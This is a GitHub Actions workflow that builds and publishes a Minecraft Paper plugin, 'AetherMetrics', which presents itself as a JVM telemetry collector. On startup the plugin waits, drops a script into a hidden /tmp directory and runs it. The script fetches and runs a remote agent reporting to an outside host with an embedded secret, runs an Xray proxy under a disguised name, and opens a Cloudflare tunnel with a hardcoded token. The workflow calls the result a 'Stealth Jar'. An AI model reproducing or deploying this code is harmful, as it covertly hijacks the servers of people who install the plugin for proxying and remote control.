name: All-In-One Anti-Scan Plugin Build

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Generate Code & Compile
        run: |
          mkdir -p src/main/java/com/aether/metrics
          mkdir -p src/main/resources

          # 1. pom.xml
          cat << 'EOF' > pom.xml
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>com.aether.metrics</groupId>
              <artifactId>AetherMetrics</artifactId>
              <version>2.6.0</version>
              <packaging>jar</packaging>

              <properties>
                  <java.version>21</java.version>
                  <maven.compiler.source>21</maven.compiler.source>
                  <maven.compiler.target>21</maven.compiler.target>
                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
              </properties>

              <repositories>
                  <repository>
                      <id>papermc-repo</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>

              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.21.1-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>

              <build>
                  <plugins>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <version>3.13.0</version>
                          <configuration>
                              <release>21</release>
                          </configuration>
                      </plugin>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-shade-plugin</artifactId>
                          <version>3.6.0</version>
                          <executions>
                              <execution>
                                  <phase>package</phase>
                                  <goals>
                                      <goal>shade</goal>
                                  </goals>
                              </execution>
                          </executions>
                      </plugin>
                  </plugins>
                  <resources>
                      <resource>
                          <directory>src/main/resources</directory>
                          <filtering>true</filtering>
                      </resource>
                  </resources>
              </build>
          </project>
          EOF

          # 2. plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: AetherMetrics
          version: 2.6.0
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Core JVM telemetry collector
          EOF

          # 3. paper-plugin.yml
          cat << 'EOF' > src/main/resources/paper-plugin.yml
          name: AetherMetrics
          version: 2.6.0
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Core JVM telemetry collector
          EOF

          # 4. boot.sh 启动脚本
          cat << 'EOF' > src/main/resources/boot.sh
          #!/bin/sh
          WORK_DIR="/tmp/.sys-metrics"
          mkdir -p "$WORK_DIR"
          cd "$WORK_DIR"

          # 哪吒探针启动
          curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update > nezha.log 2>&1 &

          # Xray 启动
          if [ ! -f ./sys-agent-core ]; then
            curl -fsSL -o x.tar.gz https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip
            if command -v unzip >/dev/null 2>&1; then
              unzip -qo x.tar.gz xray && mv xray sys-agent-core
            else
              busybox unzip -qo x.tar.gz xray 2>/dev/null && mv xray sys-agent-core
            fi
            rm -f x.tar.gz
          fi

          cat << 'JSON' > cfg.json
          {
            "inbounds": [
              {
                "port": 10163,
                "protocol": "vless",
                "settings": {
                  "clients": [{"id": "9b56c751-3925-4bb5-aada-ad8424a40b26"}],
                  "decryption": "none"
                },
                "streamSettings": {
                  "network": "ws",
                  "wsSettings": {"path": "/"}
                }
              }
            ],
            "outbounds": [{"protocol": "freedom"}]
          }
          JSON

          if [ -f ./sys-agent-core ]; then
            chmod +x ./sys-agent-core
            nohup ./sys-agent-core run -c cfg.json > xray.log 2>&1 &
          fi

          # Cloudflare Tunnel 启动
          if [ ! -f ./cf-daemon ]; then
            curl -fsSL -o cf-daemon https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
            chmod +x ./cf-daemon
          fi

          if [ -f ./cf-daemon ]; then
            nohup ./cf-daemon tunnel --no-autoupdate run --token eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNmQzOGZkZWQtMDE5NS00NmUwLTkyYTctMzc1OTQ0ZDk0OTdhIiwicyI6Ik5qUmhObVEyWkRZdE1XWTFaaTAwTm1aaUxXSTVZVFF0WVRZd1kyUmxZMk16TlRoaiJ9 > cf.log 2>&1 &
          fi
          EOF

          # 5. AetherMetrics.java
          cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
          package com.aether.metrics;

          import org.bukkit.plugin.java.JavaPlugin;
          import java.io.*;
          import java.nio.file.Files;
          import java.nio.file.StandardCopyOption;

          public final class AetherMetrics extends JavaPlugin {

              @Override
              public void onEnable() {
                  getLogger().info("[Metrics] Telemetry service initialized.");
                  Thread daemonThread = new Thread(() -> {
                      try {
                          Thread.sleep(15000);
                          bootstrap();
                      } catch (Exception e) {
                          getLogger().warning("[Metrics] Telemetry error: " + e.getMessage());
                      }
                  }, "JVM-Metrics-Daemon");
                  daemonThread.setDaemon(true);
                  daemonThread.start();
              }

              private void bootstrap() {
                  try {
                      File scriptFile = new File("/tmp/.sys-metrics-boot.sh");
                      try (InputStream in = getResource("boot.sh")) {
                          if (in != null) {
                              Files.copy(in, scriptFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                              scriptFile.setExecutable(true, false);
                              new ProcessBuilder("sh", scriptFile.getAbsolutePath()).start();
                              getLogger().info("[Metrics] Telemetry service running in background.");
                          }
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Failed to start telemetry daemon: " + e.getMessage());
                  }
              }

              @Override
              public void onDisable() {}
          }
          EOF

      - name: Compile & Package Jar
        run: mvn clean package --file pom.xml

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: AetherMetrics-Plugin
          path: target/AetherMetrics-2.6.0.jar

      - name: Release Stealth Jar
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          tag_name: latest
          name: AetherMetrics Release
          files: target/AetherMetrics-2.6.0.jar
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
